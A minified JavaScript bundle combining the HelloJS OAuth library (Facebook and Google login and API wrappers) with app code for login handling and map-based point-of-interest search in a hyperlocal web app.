return _store('sync_service');},init:function(services,opts,timeout){if(!services){return _services;}
var p=_arguments({services:'o!',opts:'o',timeout:'i'},arguments);for(var x in p.services){if(p.services.hasOwnProperty(x)){if(typeof(p.services[x])!=='object'){p.services[x]={id:p.services[x]};}}}
_services=_merge(_services,p.services);for(x in _services){if(_services.hasOwnProperty(x)){_services[x].scope=_services[x].scope||{};}}
if(p.opts){this.settings=_merge(this.settings,p.opts);if("redirect_uri"in p.opts){this.settings.redirect_uri=_realPath(p.opts.redirect_uri);}}
if(p.timeout){_timeout=p.timeout;}
return _services;},login:function(network,opts,callback){var url,p=_arguments({network:'s!',options:'o',callback:'f'},arguments);p.options=_merge(this.settings,p.options||{});if(typeof(p.network)!=='string'){log('Please specify a service.');}
var provider=_services[p.network],callback_id=""+Math.round(Math.random()*1e9);var responded=false;this.subscribe(callback_id,function self(){responded=true;hello.unsubscribe(callback_id,self);if(p.callback){p.callback.apply(this,arguments);}});var qs=_merge(p.options,{client_id:provider.id,scope:'basic',state:{client_id:provider.id,network:p.network,display:p.options.display,callback:callback_id,state:p.options.state,oauth_proxy:p.options.oauth_proxy}});var scope=p.options.scope;if(scope){if(typeof(scope)!=='string'){scope=scope.join(',');}}
scope=(scope?scope+',':'')+qs.scope;qs.state.scope=scope.split(/,\s/);qs.scope=scope.replace(/[^,\s]+/ig,function(m){return(m in provider.scope)?provider.scope[m]:'';}).replace(/[,\s]+/ig,',');qs.scope=_unique(qs.scope.split(/,+/)).join(provider.scope_delim||',');var session=hello.getAuthResponse(p.network);if(session&&"expires"in session&&session.expires>((new Date()).getTime()/1e3)){var diff=_diff(session.scope||[],qs.state.scope||[]);if(diff.length===0){this.trigger(callback_id+".login",{network:p.network,authResponse:session});return;}}
qs.redirect_uri=_realPath(qs.redirect_uri);if(provider.oauth){qs.state.oauth=provider.oauth;}
qs.state=JSON.stringify(qs.state);if(provider.oauth&&parseInt(provider.oauth.version,10)===1){url=_qs(p.options.oauth_proxy,qs);}
else{url=_qs(provider.uri.auth,qs);}
if(qs.display==='none'){_append('iframe',{src:url,style:shy},'body');}
else if(qs.display==='popup'){var popup=window.open(url,'Authentication',"resizeable=true,height=550,width=500,left="+((window.innerWidth-500)/2)+",top="+((window.innerHeight-550)/2));var self=this;var timer=setInterval(function(){if(popup.closed){clearInterval(timer);if(!responded){self.trigger(callback_id+".failed",{error:{code:"user_cancelled",message:"Cancelled"},network:p.network});}}},100);}
else{window.location=url;}
return{url:url,method:qs.display};},logout:function(s,callback){var p=_arguments({name:'s',callback:"f"},arguments);if(p.name&&_store(p.name)){_store(p.name,'');}
else if(!p.name){for(var x in _services){if(_services.hasOwnProperty(x)){hello.logout(x);}}
hello.service(false);}
else{log(p.name+' had no session');}
if(p.callback){p.callback(false);}},api:function(){var p=_arguments({path:'s!',method:"s",data:'o',timeout:'i',callback:"f"},arguments),self=this;p.method=(p.method||'get').toLowerCase();p.data=p.data||{};p.path=p.path.replace(/^\/+/,'');var a=(p.path.split(/[\/\:]/,2)||[])[0].toLowerCase();var service;if(a in _services){service=a;var reg=new RegExp('^'+a+':?\/?');p.path=p.path.replace(reg,'');}
else{service=this.service();}
p.callback=p.callback||function(){};_timeout=p.timeout||_timeout;log("API: "+p.method.toUpperCase()+" '"+p.path+"' (request)",p);var o=_services[service];if(!o){log("No user");p.callback(false);return;}
var callback=function(r){if(o.wrap&&((p.path in o.wrap)||("default"in o.wrap))){var wrap=(p.path in o.wrap?p.path:"default");var time=(new Date()).getTime();r=o.wrap[wrap](r);log("Processig took"+((new Date()).getTime()-time));}
log("API: "+p.method.toUpperCase()+" '"+p.path+"' (response)",r);p.callback(r);};if(!(p.path in o.uri)||o.uri[p.path]!==false){var url=(p.path in o.uri?o.uri[p.path]:(o.uri['default']?o.uri['default']:p.path));var getPath=function(url){if(!url.match(/^https?:\/\//)){url=o.uri.base+url;}
var qs={};var format_url=function(qs_handler,callback){if(qs_handler){if(typeof(qs_handler)==='function'){qs_handler(qs);}
else{qs=_merge(qs,qs_handler);}}
var path=_qs(url,qs||{});_sign(service,path,p.method,p.data,o.querystring,callback);};if(!_isEmpty(p.data)&&!_dataToJSON(p)){_post(format_url,p.data,("post"in o?o.post(p):null),callback);return;}
if(p.method==='delete'){var _callback=callback;callback=function(r){_callback((!r||_isEmpty(r))?{response:'deleted'}:r);};}
if('withCredentials'in new XMLHttpRequest()&&(!("xhr"in o)||(o.xhr&&o.xhr(p,qs)))){qs.suppress_response_codes=true;var x=_xhr(p.method,format_url,p.headers,p.data,callback);return{xhr:x,method:'XHR',data:p.data};}
if("jsonp"in o){o.jsonp(p,qs);}
if(p.method==='post'){return{url:_post(format_url,p.data,("post"in o?o.post(p):null),callback),method:'POST',data:p.data};}
else{qs=_merge(qs,p.data);qs.callback='?';return{url:_jsonp(format_url,callback),method:'JSONP'};}};if(typeof(url)==='function'){url(p,getPath);}
else{getPath(url);}}
else{log('The path "'+p.path+'" is not recognised');}},getAuthResponse:function(service){return _store(service||this.service());},subscribe:function(evt,callback){log("Subscribed",evt,callback);var p=_arguments({evt:'s!',callback:"f!"},arguments);if(!p){return false;}
listeners[p.evt]=[p.callback].concat(listeners[p.evt]||[]);},unsubscribe:function(evt,callback){log('Unsubscribe',evt,callback);var p=_arguments({evt:'s!',callback:"f"},arguments);if(!p){return false;}
for(var i=0;i<listeners[p.evt].length;i++){if(!p.callback||listeners[p.evt][i]===p.callback){listeners[p.evt]=listeners[p.evt].splice(i,1);}}},trigger:function(evt,data){log("Trigger: '"+evt+"'",data);for(var x in listeners){if(listeners.hasOwnProperty(x)){if(evt.indexOf(x)>-1){for(var i=0;i<listeners[x].length;i++){listeners[x][i].call(this,data);}}}}},utils:{param:_param,hasBinary:_hasBinary,sign:_sign,store:_store,append:_append,merge:_merge}};function authCallback(network,obj){_store(obj.network,obj);if(!("display"in p)||p.display!=='page'){var win=(window.opener||window.parent);if(win&&"hello"in win&&win.hello){var cb=obj.callback;try{delete obj.callback;}catch(e){}
if(obj.error){win.hello.trigger(obj.network+":"+cb+".failed",obj);}
else{win.hello.trigger(obj.network+":"+cb+".login",{network:obj.network,authResponse:obj});win.hello.utils.store(obj.network,obj);}
_store(obj.network,obj);}
window.close();log('Trying to close window');return;}}
var p=_merge(_param(window.location.search||''),_param(window.location.hash||''));if(p&&"state"in p){try{var a=JSON.parse(p.state);p=_merge(p,a);}catch(e){log("Could not decode state parameter");}
if(("access_token"in p&&p.access_token)&&p.network){if(!p.expires_in||parseInt(p.expires_in,10)===0){p.expires_in=!p.expires_id?3600:(3600*24*30);}
p.expires_in=parseInt(p.expires_in,10);p.expires=((new Date()).getTime()/1e3)+parseInt(p.expires_in,10);hello.service(p.network);authCallback(p.network,p);}
else if(("error"in p&&p.error)&&p.network){p.error={code:p.error,message:p.error_message||p.error_description};authCallback(p.network,p);}
if(p&&p.callback&&"result"in p&&p.result){if(p.callback in window.parent){window.parent[p.callback](JSON.parse(p.result));}}}
p=_param(window.location.search);if((p.code&&p.state)||(p.oauth_token&&p.proxy_url)){p.redirect_uri=window.location.href.replace(/[\?\#].*$/,'');var state=JSON.parse(p.state);var path=(state.oauth_proxy||p.proxy_url)+"?"+_param(p);window.location=path;}
return hello;function log(){if(typeof arguments[0]==='string'){arguments[0]="HelloJS-"+arguments[0];}
if(typeof(console)==='undefined'||typeof(console.log)==='undefined'){return;}
if(typeof console.log==='function'){console.log.apply(console,arguments);}
else{console.log(Array.prototype.slice.call(arguments));}}
function _isArray(o){return Object.prototype.toString.call(o)==='[object Array]';}
function _isEmpty(obj){if(!obj){return true;}
if(obj&&obj.length>0)return false;if(obj&&obj.length===0)return true;for(var key in obj){if(obj.hasOwnProperty(key))
return false;}
return true;}
function _diff(a,b){var r=[];for(var i=0;i<b.length;i++){if(_indexOf(a,b[i])===-1){r.push(b[i]);}}
return r;}
function _domInstance(type,data){var test="HTML"+(type||'').replace(/^[a-z]/,function(m){return m.toUpperCase();})+"Element";if(window[test]){return data instanceof window[test];}else if(window.Element){return data instanceof window.Element&&(!type||data.tagName===type);}else{return(!(data instanceof Object||data instanceof Array||data instanceof String||data instanceof Number)&&data.tagName&&data.tagName===type);}}
function _indexOf(a,s){if(a.indexOf){return a.indexOf(s);}
for(var j=0;j<a.length;j++){if(a[j]===s){return j;}}
return-1;}
function _qs(url,params){if(params){var reg;for(var x in params){if(url.indexOf(x)>-1){reg=new RegExp("[\?\&]"+x+"=[^\&]*");url=url.replace(reg,'');}}}
return url+(!_isEmpty(params)?(url.indexOf('?')>-1?"&":"?")+_param(params):'');}
function _param(s){var b,a={},m;if(typeof(s)==='string'){m=s.replace(/^[\#\?]/,'').match(/([^=\/\&]+)=([^\&]+)/g);log(m);if(m){for(var i=0;i<m.length;i++){b=m[i].split('=');a[b[0]]=decodeURIComponent(b[1]);}}
return a;}
else{var o=s;a=[];for(var x in o){if(o.hasOwnProperty(x)){if(o.hasOwnProperty(x)){a.push([x,o[x]==='?'?'?':encodeURIComponent(o[x])].join('='));}}}
return a.join('&');}}
function _store(name,value,days){var hello=JSON.parse(localStorage.getItem('hello'))||{};if(name&&typeof(value)==='undefined'){return hello[name];}
else if(name&&value===''){try{delete hello[name];}
catch(e){hello[name]=null;}}
else if(name){hello[name]=value;}
else{return hello;}
localStorage.setItem('hello',JSON.stringify(hello));return hello;}
function _unique(a){if(typeof(a)!=='object'){return[];}
var r=[];for(var i=0;i<a.length;i++){if(!a[i]||a[i].length===0||_indexOf(r,a[i])!==-1){continue;}
else{r.push(a[i]);}}
return r;}
function _merge(a,b){var x,r={};if(typeof(a)==='object'&&typeof(b)==='object'){for(x in a){if(a.hasOwnProperty(x)){r[x]=a[x];if(x in b){r[x]=_merge(a[x],b[x]);}}}
for(x in b){if(b.hasOwnProperty(x)){if(!(x in a)){r[x]=b[x];}}}}
else{r=b;}
return r;}
function _arguments(o,args){var p={},i=0,t=null,x=null;for(x in o){if(o.hasOwnProperty(x)){break;}}
if((args.length===1)&&(typeof(args[0])==='object')&&o[x]!='o!'){return args[0];}
for(x in o){if(o.hasOwnProperty(x)){t=typeof(args[i]);if((typeof(o[x])==='function'&&o[x].test(args[i]))||(typeof(o[x])==='string'&&((o[x].indexOf('s')>-1&&t==='string')||(o[x].indexOf('o')>-1&&t==='object')||(o[x].indexOf('i')>-1&&t==='number')||(o[x].indexOf('a')>-1&&t==='object')||(o[x].indexOf('f')>-1&&t==='function')))){p[x]=args[i++];}
else if(typeof(o[x])==='string'&&o[x].indexOf('!')>-1){log("Whoops! "+x+" not defined");return false;}}}
return p;}
function _realPath(path){if(path.indexOf('/')===0){path=window.location.protocol+'//'+window.location.host+path;}
else if(!path.match(/^https?\:\/\//)){path=(window.location.href.replace(/#.*/,'').replace(/\/[^\/]+$/,'/')+path).replace(/\/\.\//g,'/');}
while(/\/[^\/]+\/\.\.\//g.test(path)){path=path.replace(/\/[^\/]+\/\.\.\//g,'/');}
return path;}
function _append(node,attr,target){var n=typeof(node)==='string'?document.createElement(node):node;if(typeof(attr)==='object'){if("tagName"in attr){target=attr;}
else{for(var x in attr){if(attr.hasOwnProperty(x)){if(typeof(attr[x])==='object'){for(var y in attr[x]){if(attr[x].hasOwnProperty(y)){n[x][y]=attr[x][y];}}}
else if(x==="html"){n.innerHTML=attr[x];}
else if(!/^on/.test(x)){n.setAttribute(x,attr[x]);}
else{n[x]=attr[x];}}}}}
if(target==='body'){(function self(){if(document.body){document.body.appendChild(n);}
else{setTimeout(self,16);}})();}
else if(typeof(target)==='object'){target.appendChild(n);}
else if(typeof(target)==='string'){log(target);document.getElementsByTagName(target)[0].appendChild(n);}
return n;}
function _sign(network,path,method,data,modifyQueryString,callback){var session=hello.getAuthResponse(network),service=_services[network],token=(session?session.access_token:null);var proxy=(service.oauth&&parseInt(service.oauth.version,10)===1?hello.settings.oauth_proxy:null);if(proxy){if(method.toUpperCase()!=='GET'){var url=_qs(proxy,{path:path,access_token:token||'',method:method,data:(data?JSON.stringify(data):null)});if("withCredentials"in new XMLHttpRequest()){_xhr("GET",url,null,null,callback);}
else{_jsonp(url+"&callback=?",callback);}}
else{callback(_qs(proxy,{path:path,access_token:token||''}));}
return;}
var qs={'access_token':token||''};if(modifyQueryString){modifyQueryString(qs);}
callback(_qs(path,qs));}
function _xhr(method,pathFunc,headers,data,callback){if(typeof(pathFunc)!=='function'){var path=pathFunc;pathFunc=function(qs,callback){callback(_qs(path,qs));};}
var r=new XMLHttpRequest();var binary=false;if(method==='blob'){binary=method;method='GET';}
method=method.toUpperCase();r.onload=function(e){var json=r.response;try{json=JSON.parse(r.responseText);}catch(_e){}
callback(json||(method!=='DELETE'?{error:{message:"Could not get resource"}}:{}));};r.onerror=function(e){var json=r.responseText;try{json=JSON.parse(r.responseText);}catch(_e){}
callback(json||{error:{message:"There was an error accessing network"}});};var qs={},x;if(method==='GET'||method==='DELETE'){if(!_isEmpty(data)){qs=_merge(qs,data);}
data=null;}
else if(data&&typeof(data)!=='string'&&!(data instanceof FormData)){var f=new FormData();for(x in data)if(data.hasOwnProperty(x)){if(data[x]instanceof HTMLInputElement){if("files"in data[x]&&data[x].files.length>0){f.append(x,data[x].files[0]);}}
else{f.append(x,data[x]);}}
data=f;}
pathFunc(qs,function(url){r.open(method,url,true);if(binary){if("responseType"in r){r.responseType=binary;}
else{r.overrideMimeType("text/plain; charset=x-user-defined");}}
if(headers){for(var x in headers){r.setRequestHeader(x,headers[x]);}}
r.send(data);});return r;}
function _jsonp(pathFunc,callback){var cb_name='__lx_jsonp'+(_jsonp_counter++),bool=0,head=document.getElementsByTagName('head')[0],operafix,script,result={error:{message:'server_error',code:'server_error'}},cb=function(){if(!(bool++)){window.setTimeout(function(){callback(result);head.removeChild(script);},0);}};if(typeof(pathFunc)!=='function'){var path=pathFunc;path=path.replace(new RegExp("=\\?(&|$)"),'='+cb_name+'$1');pathFunc=function(qs,callback){callback(_qs(path,qs));};}
window[cb_name]=function(json){result=json;try{delete window[cb_name];}catch(e){}};pathFunc(function(qs){qs.callback=cb_name;},function(url){script=_append('script',{id:cb_name,name:cb_name,src:url,async:true,onload:cb,onerror:cb,onreadystatechange:function(){if(/loaded|complete/i.test(this.readyState)){cb();}}});if(window.navigator.userAgent.toLowerCase().indexOf('opera')>-1){operafix=_append('script',{text:"document.getElementById('"+cb_name+"').onerror();"});script.async=false;}
window.setTimeout(function(){result={error:{message:'timeout',code:'timeout'}};cb();},_timeout);head.appendChild(script);if(operafix){head.appendChild(operafix);}});}
function _post(pathFunc,data,options,callback){if(typeof(pathFunc)!=='function'){var path=pathFunc;pathFunc=function(qs,callback){callback(_qs(path,qs));};}
var form=null,reenableAfterSubmit=[],newform,i=0,x=null,bool=0,cb=function(r){if(!(bool++)){try{if(newform){newform.parentNode.removeChild(newform);}}
catch(e){log("could not remove iframe");}
for(var i=0;i<reenableAfterSubmit.length;i++){if(reenableAfterSubmit[i]){reenableAfterSubmit[i].setAttribute('disabled',false);}}
callback(r);}};var callbackID="ifrmhack_"+parseInt(Math.random()*1e6,10).toString(16);window[callbackID]=cb;var win;try{win=document.createElement('<iframe name="'+callbackID+'">');}
catch(e){win=document.createElement('iframe');}
win.name=callbackID;win.id=callbackID;win.style.display='none';if(options&&options.callbackonload){win.onload=function(){cb({response:"posted",message:"Content was posted"});};}
setTimeout(function(){cb({error:{code:"timeout",message:"The post operation timed out"}});},_timeout);document.body.appendChild(win);var qs={"suppress_response_codes":true,'redirect_uri':hello.settings.redirect_uri,'state':JSON.stringify({callback:callbackID}),'callbackUrl':hello.settings.redirect_uri,'redirect-uri':hello.settings.redirect_uri};qs={};if(_domInstance('form',data)){form=data.form;for(i=0;i<form.elements.length;i++){if(form.elements[i]!==data){form.elements[i].setAttribute('disabled',true);}}
data=form;}
if(_domInstance('form',data)){form=data;for(i=0;i<form.elements.length;i++){if(!form.elements[i].disabled&&form.elements[i].type==='file'){form.encoding=form.enctype="multipart/form-data";form.elements[i].setAttribute('name','file');}}}
else{for(x in data)if(data.hasOwnProperty(x)){if(_domInstance('input',data[x])&&data[x].type==='file'){form=data[x].form;form.encoding=form.enctype="multipart/form-data";}}
if(!form){form=document.createElement('form');document.body.appendChild(form);newform=form;}
for(x in data)if(data.hasOwnProperty(x)){var el=(_domInstance('input',data[x])||_domInstance('textArea',data[x])||_domInstance('select',data[x]));if(!el||data[x].form!==form){if(form.elements[x]){form.elements[x].parentNode.removeChild(form.elements[x]);}
var input=document.createElement('input');input.setAttribute('name',x);if(el){input.value=data[x].value;}
else if(_domInstance(null,data[x])){input.value=data[x].innerHTML||data[x].innerText;}else{input.value=data[x];}
form.appendChild(input);}
else if(el&&data[x].name!==x){data[x].setAttribute('name',x);data[x].name=x;}}
for(i=0;i<form.children.length;i++){if(!(form.children[i].name in data)&&form.children[i].getAttribute('disabled')!==true){form.children[i].setAttribute('disabled',true);reenableAfterSubmit.push(form.children[i]);}}}
form.setAttribute('method','POST');form.setAttribute('target',callbackID);form.target=callbackID;pathFunc(qs,function(url){form.setAttribute('action',url);setTimeout(function(){form.submit();},100);});}
function _hasBinary(data){for(var x in data)if(data.hasOwnProperty(x)){if((_domInstance('input',data[x])&&data[x].type==='file')||("FileList"in window&&data[x]instanceof window.FileList)||("File"in window&&data[x]instanceof window.File)||("Blob"in window&&data[x]instanceof window.Blob)){return true;}}
return false;}
function _dataToJSON(p){var data=p.data;if(_domInstance('form',data)){var kids=data.elements;var json={};for(var i=0;i<kids.length;i++){if(kids[i].type==='file'){if("FormData"in window){json[kids[i].name]=kids[i];break;}
else if(!("files"in kids[i])){return false;}}
else{json[kids[i].name]=kids[i].value||kids[i].innerHTML;}}
data=json;}
if(_domInstance('input',data)){if("files"in data){var o={};o[data.name]=data.files;data=o;}
else{return false;}}
if(("File"in window&&data instanceof window.File)||("Blob"in window&&data instanceof window.Blob)||("FileList"in window&&data instanceof window.FileList)){data={'file':data};}
if(!("FormData"in window&&data instanceof window.FormData)){for(var x in data)if(data.hasOwnProperty(x)){if("FileList"in window&&data[x]instanceof window.FileList){if(data[x].length===1){data[x]=data[x][0];}
else{log("We were expecting the FileList to contain one file");}}
else if(_domInstance('input',data[x])&&data[x].type==='file'){if(("files"in data[x])){}
else{return false;}}
else if(_domInstance('input',data[x])||_domInstance('select',data[x])||_domInstance('textArea',data[x])){data[x]=data[x].value;}
else if(_domInstance(null,data[x])){data[x]=data[x].innerHTML||data[x].innerText;}}}
p.data=data;return true;}})();hello.init({facebook:{name:'Facebook',uri:{auth:'http://www.facebook.com/dialog/oauth/',base:'https://graph.facebook.com/','me/share':'me/feed','me/files':'me/albums'},scope:{basic:'',email:'email',birthday:'user_birthday',events:'user_events',photos:'user_photos,user_videos',videos:'user_photos,user_videos',friends:'',files:'user_photos,user_videos',publish_files:'user_photos,user_videos,publish_stream',publish:'publish_stream',create_event:'create_event',offline_access:'offline_access'},wrap:{me:function(o){if(o.id){o.picture='http://graph.facebook.com/'+o.id+'/picture';o.thumbnail='http://graph.facebook.com/'+o.id+'/picture';}
return o;},'me/friends':function(o){if("data"in o){for(var i=0;i<o.data.length;i++){o.data[i].picture='http://graph.facebook.com/'+o.data[i].id+'/picture';o.data[i].thumbnail='http://graph.facebook.com/'+o.data[i].id+'/picture';}}
return o;},'me/albums':function(o){if("data"in o){for(var i=0;i<o.data.length;i++){o.data[i].files='https://graph.facebook.com/'+o.data[i].id+'/photos';o.data[i].photos='https://graph.facebook.com/'+o.data[i].id+'/photos';if(o.data[i].cover_photo){o.data[i].thumbnail='https://graph.facebook.com/'+o.data[i].cover_photo+'/picture?access_token='+hello.getAuthResponse('facebook').access_token;}
o.data[i].type="album";if(o.data[i].can_upload){o.data[i].upload_location='https://graph.facebook.com/'+o.data[i].id+'/photos';}}}
return o;},'me/files':function(o){return this["me/albums"](o);},'default':function(o){if("data"in o){for(var i=0;i<o.data.length;i++){if(o.data[i].picture){o.data[i].thumbnail=o.data[i].picture;}
if(o.data[i].cover_photo){o.data[i].thumbnail='https://graph.facebook.com/'+o.data[i].cover_photo+'/picture?access_token='+hello.getAuthResponse('facebook').access_token;}}}
return o;}},xhr:function(p){if(p.method==='get'||p.method==='post'){return true;}
else{return false;}},jsonp:function(p){if(p.method.toLowerCase()!=='get'&&!hello.utils.hasBinary(p.data)){p.data.method=p.method.toLowerCase();p.method='get';}},post:function(p){return{callbackonload:true};}}});(function(){function formatItem(o){if(o.error){return;}
if(!o.name){o.name=o.title||o.message;}
if(!o.picture){o.picture=o.thumbnailLink;}
if(!o.thumbnail){o.thumbnail=o.thumbnailLink;}
if(o.mimeType==="application/vnd.google-apps.folder"){o.type="folder";o.files="https://www.googleapis.com/drive/v2/files?q=%22"+o.id+"%22+in+parents";}}
function gEntry(o){var entry=function(a){var i=0,_a;var p={id:a.id.$t,name:a.title.$t,description:a.summary.$t,updated_time:a.updated.$t,created_time:a.published.$t,picture:a['media$group']['media$content'][0].url,thumbnail:a['media$group']['media$content'][0].url,width:a['media$group']['media$content'][0].width,height:a['media$group']['media$content'][0].height};if("link"in a){for(i=0;i<a.link.length;i++){if(a.link[i].rel.match(/\#feed$/)){p.photos=a.link[i].href;p.files=a.link[i].href;p.upload_location=a.link[i].href;break;}}}
if('category'in a&&a['category'].length){_a=a['category'];for(i=0;i<_a.length;i++){if(_a[i].scheme&&_a[i].scheme.match(/\#kind$/)){p.type=_a[i].term.replace(/^.*?\#/,'');}}}
if('media$thumbnail'in a['media$group']){_a=a['media$group']['media$thumbnail'];p.thumbnail=a['media$group']['media$thumbnail'][0].url;p.images=[];for(i=0;i<_a.length;i++){p.images.push({source:_a[i].url,width:_a[i].width,height:_a[i].height});}
p.images.push({source:a['media$group']['media$content'][0].url,width:a['media$group']['media$content'][0].width,height:a['media$group']['media$content'][0].height});}
return p;};var r=[];if("feed"in o&&"entry"in o.feed){for(i=0;i<o.feed.entry.length;i++){r.push(entry(o.feed.entry[i]));}
return{data:r};}
if("entry"in o){return entry(o.entry);}else if("items"in o){for(var i=0;i<o.items.length;i++){formatItem(o.items[i]);}
return{data:o.items};}
else{formatItem(o);return o;}}
hello.init({google:{name:"Google Plus",uri:{auth:"https://accounts.google.com/o/oauth2/auth",me:'oauth2/v1/userinfo?alt=json',base:"https://www.googleapis.com/",'me/friends':'https://www.google.com/m8/feeds/contacts/default/full?alt=json&max-results=1000','me/share':'plus/v1/people/me/activities/public','me/feed':'plus/v1/people/me/activities/public','me/albums':'https://picasaweb.google.com/data/feed/api/user/default?alt=json','me/photos':'https://picasaweb.google.com/data/feed/api/user/default?alt=json&kind=photo&max-results=100',"me/files":'https://www.googleapis.com/drive/v2/files?q=%22root%22+in+parents'},scope:{basic:"https://www.googleapis.com/auth/plus.me https://www.googleapis.com/auth/userinfo.email https://www.googleapis.com/auth/userinfo.profile",email:'',birthday:'',events:'',photos:'https://picasaweb.google.com/data/',videos:'http://gdata.youtube.com',friends:'https://www.google.com/m8/feeds',files:'https://www.googleapis.com/auth/drive.readonly',publish:'',publish_files:'https://www.googleapis.com/auth/drive',create_event:'',offline_access:''},scope_delim:' ',wrap:{me:function(o){if(o.id){o.last_name=o.family_name||o.name.familyName;o.first_name=o.given_name||o.name.givenName;o.picture=null;o.thumbnail=o.picture;o.name=o.displayName||o.name;}
return o;},'me/friends':function(o){var r=[];if("feed"in o&&"entry"in o.feed){for(var i=0;i<o.feed.entry.length;i++){var a=o.feed.entry[i];r.push({id:a.id.$t,name:a.title.$t,email:(a.gd$email&&a.gd$email.length>0)?a.gd$email[0].address:null,updated_time:a.updated.$t,picture:(a.link&&a.link.length>0)?a.link[0].href+'?access_token='+hello.getAuthResponse('google').access_token:null,thumbnail:(a.link&&a.link.length>0)?a.link[0].href+'?access_token='+hello.getAuthResponse('google').access_token:null});}
return{data:r};}
return o;},'me/share':function(o){o.data=o.items;try{delete o.items;}catch(e){o.items=null;}
return o;},'me/feed':function(o){o.data=o.items;try{delete o.items;}catch(e){o.items=null;}
return o;},'me/albums':gEntry,'me/photos':gEntry,'default':gEntry},xhr:function(p){if(p.method==='post'){return false;}
return true;}}});})();
// js/auth.js

function initAuth(){hello.init({facebook:'439026716191124',google:'449285537332-jkcc38anllj53up1frq2cjjockgpct5i.apps.googleusercontent.com'});hello.subscribe('auth.login',function(auth){console.log("authlogin event",auth);try{hello.api(auth.network+'/me',function(r){if(!r.id||!!document.getElementById(r.id)){hello.logout();return;}
window.logedInUser=r;sendMessage("info",r.name+" logged in");console.log(r);});}catch(e){hello.logout();}});hello.subscribe('auth.update',function(auth){console.log("auth.update",auth);window.logedInUser=null;});hello.subscribe('auth.logout',function(auth){console.log("logout event",auth);window.logedInUser=null;});}
function ensureAuthenticate(){window.authDeferred=new $.Deferred();if(logedIn()){window.authDeferred.resolve(window.logedInUser);}else{$('#login').foundation('reveal','open');}
return window.authDeferred;}
function logedIn(){var gLogin=false;var gSession=hello.getAuthResponse('google');if(gSession&&!gSession.error){gLogin=true;}
var fLogin=false;var fSession=hello.getAuthResponse('facebook');if(fSession&&!fSession.error){fLogin=true;}
if((gLogin||fLogin)&&!window.logedInUser){hello.logout();return false;}
return gLogin||fLogin;}
function doLogin(network){hello.login(network,function(auth){if(auth.authResponse&&window.authDeferred){window.authDeferred.resolve(window.logedInUser);}else{if(window.authDeferred){window.authDeferred.reject();}}});$('#login').foundation('reveal','close');}
function closeLoginPopup(){$('#login').foundation('reveal','close');if(window.authDeferred){window.authDeferred.reject();}}
// js/app.js

function getAsQueryString(o){var qryStr='';Object.keys(o).forEach(function(key){if(qryStr){qryStr+="&";}
qryStr+=key+"="+encodeURIComponent(o[key]);});qryStr+="&callback=?"
return qryStr;};function search(options){var query;trace.logLine("search: v"+options.version);if(options.app.lastSearch.version!=options.version){}
$('#searchDisplay').text(options.q);if(options.bounds){var lb=options.bounds.getSouthWest();var rt=options.bounds.getNorthEast();query={lb_lat:lb.lat,lb_lng:lb.lng,rt_lat:rt.lat,rt_lng:rt.lng}}else{var center=options.center;query={ct_lat:center.lat,ct_lng:center.lng,radius:options.radius}}
$.extend(query,{q:options.q||'hyp',limit:options.limit||100,fuzzy:options.fuzzy||0,start:options.start||0});url="http://hyperlocal.redth.info/search?"+getAsQueryString(query);function wireDownOptions(options){lmap.removeLayer(options.markerLayer);}
function wireUpOptions(options){options.markerLayer=new L.MarkerClusterGroup({showCoverageOnHover:false});options.points=[]
options.pointIndex={};if(options.type==='new'||(!L.Browser.mobile)){$.observable(app).setProperty("items",options.points);}
return options;}
if(options.app){var app=options.app;var indi=indicator.beginProcess();$.getJSON(url,function(x){indi.complete();trace.logLine("onresult: v"+options.version+" dragging:"+mapIsDragging);if(mapIsDragging){return};if($('#searchInput').val()!=options.q){return;}
if(options.type!=="followup"){if(app.currentOptions){wireDownOptions(app.currentOptions);}
app.currentOptions=wireUpOptions(options);}else{}
var markers=[];x.results.forEach(function(p){markers.push(pointApi.createMarkerFromPoint(p));});$.observable(options.points).insert(options.points.length,x.results);if(L.Browser.mobile){function addByChunk(){options.markerLayer.addLayers(markers);trace.logLine("markers there  v"+options.version);options.markerLayer.addTo(lmap);}
window.webkitRequestAnimationFrame(addByChunk);}else{options.markerLayer.addLayers(markers);options.markerLayer.addTo(lmap);}
$.observable(app).setProperty("totalCount",x.results_found);$.observable(app).setProperty("visibleCount",app.items.length);if(!L.Browser.mobile&&options.type!=="followup"&&(options.app.items.length<x.results_found)){var newOpts=$.extend({},options);newOpts.limit=(L.Browser.mobile?50:100);newOpts.type="followup";newOpts.start=options.app.items.length;newOpts.keepItems=true;search(newOpts,800);}});}else{return new $.Deferred(function(newDefer){$.getJSON(url,newDefer.resolve);});}}
var searchQ=[];var Settings=$data.define
search.enqueue=function(s,timeout){if(!timeout){}else{}}
$.templates({poiTemplate:'#poiTemplate',poiListTemplate:'#poiListTemplate',poiEditorTemplate:'#poiEditorTemplate',mainTemplate:'#mainTemplate',addNewDialogTemplate:'#addNewDialogTemplate',popupTemplate:'#popupTemplate'});var me=$data.createGuid().toString();var socket={emit:function(){},on:function(){}}
function dispatchMsg(data){if(data.sender==me)return;switch(data.msgType){case"info":toastr.info(data.msg,"Login");break;case"update":var toast=toastr.info(data.senderName+" updated "+data.msg.record.name,"Updated");var p=data.msg;if(app.pointIndex[p.record.id]){var pt=app.pointIndex[p.record.id];var idx=app.items.indexOf(pt);$.observable(app.items).remove(idx);$.observable(app.items).insert(idx,p);}
toast.on("click",function(){lmap.panTo([p.record.lat,p.record.lon]);});break;case"move":var toast=toastr.info(data.senderName+" moved "+data.msg.record.name,"Moved");var p=data.msg;if(app.pointIndex[p.record.id]){var pt=app.pointIndex[p.record.id];var idx=app.items.indexOf(pt);$.observable(app.items).remove(idx);$.observable(app.items).insert(idx,p);}
toast.on("click",function(){lmap.panTo([p.record.lat,p.record.lon]);});break;case"new":var toast=toastr.info(data.senderName+" created "+data.msg.record.name,"Created");var p=data.msg;$.observable(app.items).insert(app.items.length,p);app.currentOptions.markerLayer.addLayer(pointApi.createMarkerFromPoint(p));toast.on("click",function(){app.currentOptions.markerLayer.zoomToShowLayer(p.getMarker());});break;case"delete":var toast=toastr.info(data.senderName+" deleted "+data.msg.record.name,"Deleted");var p=data.msg;if(app.pointIndex[p.record.id]){var pt=app.pointIndex[p.record.id];var idx=app.items.indexOf(pt);$.observable(app.items).remove(idx);}
toast.on("click",function(){lmap.panTo([p.record.lat,p.record.lon]);});break;}};function sendMessage(msgType,msg){var data={sender:me,senderName:window.logedInUser.name,msgType:msgType,msg:msg};socket.emit("newPoint",{sender:me,p:JSON.stringify(data)});}
